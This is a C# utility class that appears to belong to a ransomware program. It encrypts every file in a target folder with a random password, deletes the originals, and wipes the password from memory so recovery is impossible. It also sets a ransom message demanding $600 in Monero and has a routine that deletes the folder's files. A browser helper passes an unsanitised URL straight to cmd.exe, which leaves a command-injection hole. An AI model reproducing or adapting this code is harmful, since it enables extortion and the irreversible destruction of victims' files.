using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;


namespace S4VEtheD4TE
{
    public class Utils
    {
        private static string folderPath = @"C:\encryption_tests";

        //  Call this function to remove the key from memory after use for security
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        public static void EncryptFiles()
        {
            // Encrypt files
            Encryption encryption = new Encryption();

            // Generates random string
            string password = encryption.RandomString(64);

            // For additional security Pin the password of your files
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);

            foreach (string file in Directory.GetFiles(folderPath, "*.*"))
            {
                // Encrypt the file
                encryption.FileEncrypt(file, password);

                // Deletes original file
                File.Delete(file);
            }

            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }

        public static void OpenDefaultBrowser(string URL)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();


            cmd.StandardInput.WriteLine("start " + URL);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
        }

        public static void RaisePrice(System.Windows.Forms.Label label)
        {
            label.Text = "Send $600 worth of Monero to this address:";
        }

        public static void DeleteFiles()
        {
            foreach (string file in Directory.GetFiles(folderPath, "*.*"))
            {
                // Deletes original files
                File.Delete(file);
            }
        }
    }
}
